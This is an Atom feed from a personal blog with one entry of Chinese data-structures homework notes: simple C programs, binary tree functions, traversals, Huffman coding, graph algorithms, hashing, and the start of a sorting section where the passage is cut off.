<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>False</title>
  
  
  <link href="http://blog.falsectf.top/atom.xml" rel="self"/>
  
  <link href="http://blog.falsectf.top/"/>
  <updated>2021-05-11T13:55:33.492Z</updated>
  <id>http://blog.falsectf.top/</id>
  
  <author>
    <name>False</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据结构</title>
    <link href="http://blog.falsectf.top/2021/01/02/452.html"/>
    <id>http://blog.falsectf.top/2021/01/02/452.html</id>
    <published>2021-01-02T09:54:13.000Z</published>
    <updated>2021-05-11T13:55:33.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一次作业-熟悉C语言代码"><a href="#第一次作业-熟悉C语言代码" class="headerlink" title="第一次作业-熟悉C语言代码"></a>第一次作业-熟悉C语言代码</h2><ul><li>输出hello world</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义一个整数a，分别通过键盘输入和直接定义赋值的方法对其赋值并输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过键盘输入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d&quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//直接赋值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义整数a,b。赋值并计算a+b</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a = <span class="number">3</span>;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d&quot;</span>,a,b,a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>利用函数的方法实现上题中的整数加和操作。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">4</span>, b = <span class="number">9</span>;</span><br><span class="line">    sum(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> suma,<span class="keyword">int</span> sumb)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d&quot;</span>,suma,sumb,sumb+suma);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>定义一个数组，分别通过键盘输入和直接定义赋值的方法对其赋值，并输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接赋值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">9</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a[%d] = %d\n&quot;</span>,i,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//键盘输入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a[%d] = %d\n&quot;</span>,i,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义数组a,b。赋值并输出两个数组中元素对应加和的结果。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">3</span>]=&#123;<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a[%d] + b[%d] ==&gt; %d + %d =  %d\n&quot;</span>,i,i,a[i],b[i],a[i]+b[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>利用函数实现上一题</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,b[<span class="number">3</span>]=&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p=a,*q=b;</span><br><span class="line">    sum(p,q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> *p,<span class="keyword">int</span> *q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a[%d] + b[%d] ==&gt; %d + %d = %d\n&quot;</span>,i,i,*p,*q,*p + *q);</span><br><span class="line">        p++;</span><br><span class="line">        q++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义一个学生结构体，包含学生的学号和年龄的信息，赋值并输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/* data */</span></span><br><span class="line">        <span class="keyword">int</span> id;</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    &#125;;    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st1</span> =</span> &#123;<span class="number">13</span>,<span class="number">21</span>,<span class="string">&quot;åˆ˜åˆ©&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;id=%d age=%d name=%s\n&quot;</span>,st1.id,st1.age,st1.name);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二次作业-存储结构"><a href="#第二次作业-存储结构" class="headerlink" title="第二次作业-存储结构"></a>第二次作业-存储结构</h2><ul><li>顺序存储结构和链式存储结构的区别：</li></ul><blockquote><ol><li><p>顺序存储结构的内存地址是连续的，链式存储结构的内存地址是随机的。</p></li><li><p>顺序存储结构在数据量较大时，频繁的更改数据需要移动大量的数据，</p><p>链式存储结构可以适用于较频繁的数据更改操作，只需要修改指针域的值即可。</p></li></ol></blockquote><ul><li>顺序存储结构与链式存储结构的优缺点：</li></ul><blockquote><p>顺序存储结构：</p><p>​        节约空间，相较链式少一个指针域</p><p>​        可以随机存取元素，方便操作</p><p>链式存储结构：</p><p>​        插入和删除数据比顺序存储结构方便(只要找好插入位置的前驱后继元素的指针)</p></blockquote><h2 id="第三次作业-递归函数-amp-队列"><a href="#第三次作业-递归函数-amp-队列" class="headerlink" title="第三次作业-递归函数&amp;队列"></a>第三次作业-递归函数&amp;队列</h2><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>在顺序存储时，为什么选择顺序存储循环队列？</p><blockquote><p>相对于顺序队列来讲，顺序队列在元素出队后，头指针向后移动，导致删除元素后的空间无法再利用，即使元素个数小于空间大小，依然无法再进行插入，即所谓的 ”假上溢“。当使用循环队列后，删除元素后的空间仍然可以利用，最大限度的利用空间。</p></blockquote><h2 id="树、二叉树"><a href="#树、二叉树" class="headerlink" title="树、二叉树"></a>树、二叉树</h2><p>简述 树、有序树、二叉树的关系。</p><blockquote><p>树：子树没有左右之分。</p><p>二叉树、有序树：子树有左右之分。</p><p>二叉树、有序树：在只有一颗树的情况下，二叉树有左右之分。有序树无左右之分。</p></blockquote><h3 id="树的代码"><a href="#树的代码" class="headerlink" title="树的代码"></a>树的代码</h3><h4 id="写出二叉树的存储结构"><a href="#写出二叉树的存储结构" class="headerlink" title="写出二叉树的存储结构"></a>写出二叉树的存储结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span> , *<span class="title">rchild</span>;</span>s</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><h4 id="写出建树代码"><a href="#写出建树代码" class="headerlink" title="写出建树代码"></a>写出建树代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">        *T=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *T=(BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">        <span class="keyword">if</span>(!*T)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        (*T)-&gt;data=ch;</span><br><span class="line">        CreateBiTree(&amp;((*T)-&gt;lchild));</span><br><span class="line">        CreateBiTree(&amp;((*T)-&gt;rchild));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="求树的高度"><a href="#求树的高度" class="headerlink" title="求树的高度"></a>求树的高度</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">high</span><span class="params">(BiTree T)</span></span>&#123; <span class="comment">//树的高度</span></span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        a = high(T-&gt;lchild);</span><br><span class="line">        b = high(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b) <span class="keyword">return</span> a+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="求叶子个数"><a href="#求叶子个数" class="headerlink" title="求叶子个数"></a>求叶子个数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leavenodes</span><span class="params">(BiTree T)</span></span>&#123; <span class="comment">//叶子个数</span></span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span>(T-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; T-&gt;rchild==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> leavenodes(T-&gt;lchild)+leavenodes(T-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="求二叉树结点个数"><a href="#求二叉树结点个数" class="headerlink" title="求二叉树结点个数"></a>求二叉树结点个数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">totalnodes</span><span class="params">(BiTree T)</span></span>&#123; <span class="comment">//结点个数</span></span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>+totalnodes(T-&gt;rchild)+totalnodes(T-&gt;lchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="只交换左右子树"><a href="#只交换左右子树" class="headerlink" title="只交换左右子树"></a>只交换左右子树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange</span><span class="params">(BiTree T)</span></span>&#123; <span class="comment">//左右交换</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    <span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        p = T-&gt;lchild;</span><br><span class="line">        T-&gt;lchild = T-&gt;rchild;</span><br><span class="line">        T-&gt;rchild = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="交换所有层次左右子树"><a href="#交换所有层次左右子树" class="headerlink" title="交换所有层次左右子树"></a>交换所有层次左右子树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange</span><span class="params">(BiTree T)</span></span>&#123; <span class="comment">//左右交换</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    <span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        p = T-&gt;lchild;</span><br><span class="line">        T-&gt;lchild = T-&gt;rchild;</span><br><span class="line">        T-&gt;rchild = p;</span><br><span class="line">        exchange(T-&gt;lchild); <span class="comment">//多了两个递归</span></span><br><span class="line">        exchange(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先、中、后序遍历"><a href="#先、中、后序遍历" class="headerlink" title="先、中、后序遍历"></a>先、中、后序遍历</h3><blockquote><p>规则：</p><p>11111</p></blockquote><h4 id="已知先、中序求后序遍历"><a href="#已知先、中序求后序遍历" class="headerlink" title="已知先、中序求后序遍历"></a>已知先、中序求后序遍历</h4><p><img src="/images/qm/data_struct/DLR-R.png"></p><h4 id="已知中、后序求先序遍历"><a href="#已知中、后序求先序遍历" class="headerlink" title="已知中、后序求先序遍历"></a>已知中、后序求先序遍历</h4><p><img src="/images/qm/data_struct/DLR-D.png"></p><h3 id="树之间的转换"><a href="#树之间的转换" class="headerlink" title="树之间的转换"></a>树之间的转换</h3><h4 id="树——-gt-二叉树"><a href="#树——-gt-二叉树" class="headerlink" title="树——&gt;二叉树"></a>树——&gt;二叉树</h4><p><img src="/images/qm/data_struct/tree-bitree.png"></p><h4 id="森林——-gt-二叉树"><a href="#森林——-gt-二叉树" class="headerlink" title="森林——&gt;二叉树"></a>森林——&gt;二叉树</h4><p><img src="/images/qm/data_struct/trees-bitree.png"></p><h4 id="二叉树——-gt-树"><a href="#二叉树——-gt-树" class="headerlink" title="二叉树——&gt;树"></a>二叉树——&gt;树</h4><p><img src="/images/qm/data_struct/bintree-tree.png"></p><h4 id="二叉树——-gt-森林"><a href="#二叉树——-gt-森林" class="headerlink" title="二叉树——&gt;森林"></a>二叉树——&gt;森林</h4><p><img src="/images/qm/data_struct/bintree-trees.png"></p><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><blockquote><p>已知某系统在通信联络中只能出现8种字符。其概率分别为0.1 , 0.12 , 0.25 , 0.06 , 0.05 , 0.22 , 0.18 , 0.02,试设计哈夫曼编码。</p></blockquote><p>这里为了方便计数，每个结点的权值都成了100变成整数</p><p><img src="/images/qm/data_struct/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91-1.png"></p><h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><blockquote><p>假设又四个字母ABCD，它们在电报种的排列为ABCBDABCAC，试设计四个字母的编码。</p></blockquote><p>设A的权重为3，B为3，C为3，D为1</p><p><img src="/images/qm/data_struct/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91-2.png"></p><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="邻接矩阵-amp-邻接表"><a href="#邻接矩阵-amp-邻接表" class="headerlink" title="邻接矩阵&amp;邻接表"></a>邻接矩阵&amp;邻接表</h3><blockquote><p>已知G={V,E}，V={a , b , c , d , e , f , g}，E={&lt;a,b&gt; , &lt;a,g&gt; , &lt;b,g&gt; , &lt;c,b&gt; , &lt;d,c&gt; , &lt;d,f&gt; , &lt;e,d&gt; , &lt;f,a&gt; , &lt;f,e&gt; , &lt;g,c&gt; , &lt;g,d&gt; , &lt;g,f&gt;}。画图、写出邻接矩阵和邻接表，并根据图形鞋出以结点a出发的DFS和BFS</p></blockquote><h4 id="根据已知条件画图"><a href="#根据已知条件画图" class="headerlink" title="根据已知条件画图"></a>根据已知条件画图</h4><p><img src="/images/qm/data_struct/%E5%9B%BE.png"></p><h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><p>如果是无向图的话，邻接矩阵是关于i=j对称的</p><p><img src="/images/qm/data_struct/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5.png"></p><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h4><p><img src="/images/qm/data_struct/%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><h4 id="DFS-amp-BFS"><a href="#DFS-amp-BFS" class="headerlink" title="DFS&amp;BFS"></a>DFS&amp;BFS</h4><blockquote><p>DFS：a -&gt; b -&gt; g -&gt; c -&gt; d -&gt; f -&gt; e</p><p>BFS：a -&gt; b -&gt; g -&gt; c -&gt; d -&gt; f -&gt; e</p><p>！我的BFS好像是错的  正确答案忘记是啥了</p></blockquote><h2 id="图的应用"><a href="#图的应用" class="headerlink" title="图的应用"></a>图的应用</h2><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><p><img src="/images/qm/data_struct/%E5%9B%BE%E7%9A%84%E5%BA%94%E7%94%A8.png"></p><blockquote><p>从点2触发，利用Prim/Kruskal算法求最小生成树(写步骤)。</p></blockquote><h4 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h4><p><img src="/images/qm/data_struct/Prim.png"></p><h4 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h4><p><img src="/images/qm/data_struct/Kruskal.png"></p><h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><p><img src="/images/qm/data_struct/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84.png"></p><table><thead><tr><th></th><th>Ve</th><th>Vl</th><th></th><th>e</th><th>l</th><th>l-e</th></tr></thead><tbody><tr><td>V0</td><td>0</td><td>0</td><td>a1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>V1</td><td>3</td><td>3</td><td>a2</td><td>0</td><td>0</td><td>0</td></tr><tr><td>V2</td><td>6</td><td>6</td><td>a3</td><td>3</td><td>3</td><td>0</td></tr><tr><td>V3</td><td>13</td><td>15</td><td>a4</td><td>3</td><td>11</td><td>8</td></tr><tr><td>V4</td><td>11</td><td>11</td><td>a5</td><td>3</td><td>10</td><td>7</td></tr><tr><td>V5</td><td>7</td><td>7</td><td>a6</td><td>6</td><td>6</td><td>0</td></tr><tr><td>V6</td><td>19</td><td>19</td><td>a7</td><td>11</td><td>13</td><td>2</td></tr><tr><td>V7</td><td>21</td><td>21</td><td>a8</td><td>7</td><td>7</td><td>0</td></tr><tr><td>V8</td><td>28</td><td>28</td><td>a9</td><td>13</td><td>19</td><td>6</td></tr><tr><td></td><td></td><td></td><td>a10</td><td>13</td><td>15</td><td>2</td></tr><tr><td></td><td></td><td></td><td>a11</td><td>11</td><td>11</td><td>0</td></tr><tr><td></td><td></td><td></td><td>a12</td><td>7</td><td>13</td><td>6</td></tr><tr><td></td><td></td><td></td><td>a13</td><td>7</td><td>11</td><td>4</td></tr><tr><td></td><td></td><td></td><td>a14</td><td>19</td><td>24</td><td>5</td></tr><tr><td></td><td></td><td></td><td>a15</td><td>19</td><td>19</td><td>0</td></tr><tr><td></td><td></td><td></td><td>a16</td><td>21</td><td>21</td><td>0</td></tr></tbody></table><p>最后关键路径需要走的点就是 l-e = 0的点</p><p>关键路径：V0 -&gt; V2 -&gt; V5 -&gt;V4 -&gt; V6 -&gt; V7 -&gt; V8</p><p>关键路径：V0 -&gt; V1 -&gt; V2 -&gt; V5 -&gt; V4 -&gt; V6 -&gt; V7 -&gt; V8</p><h3 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h3><p>已给数值10，19，0，5，8，15，25，7，转化为二叉树</p><p><img src="/images/qm/data_struct/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91.png"></p><h2 id="线性探测"><a href="#线性探测" class="headerlink" title="线性探测"></a>线性探测</h2><blockquote><p>散列表的地址区间为0~15，鳃裂函数为H(key) = key%13，设有一组关键字{19 , 01 , 23 , 14 , 55 , 20 , 84}，采用线性探测法解决冲突，依次存放在散列表中。问：</p><ol><li>元素84存放在散列表中的地址是多少？</li><li>搜索元素84需要的比较次数是多少？</li></ol></blockquote><p>答：</p><p>(1)线性探测法构建散列表如下</p><table><thead><tr><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th>4</th><th>5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th>9</th><th align="center">10</th><th>11</th><th>12</th></tr></thead><tbody><tr><td align="center"></td><td align="center">01</td><td align="center">14</td><td align="center">55</td><td></td><td></td><td align="center">19</td><td align="center">20</td><td align="center">84</td><td></td><td align="center">23</td><td></td><td></td></tr></tbody></table><p>！！！地址栏不用画出来，直接画存数据的那一行就可以了</p><p>所以84存放在散列表中的地址为8</p><p>(2)84 mod 13 = 6，但是因为地址为6处已经有值，进行冲突探测6-&gt;8共经过3次比较2次探测</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>利用插入法、起泡排序法、快速排序法和简单选择排序法分别写出下面序列的从小到大的排序结果。</p><p>待排序序列：60、43、29、56、48、72、57、30</p><h3 id="1-插入排序"><a 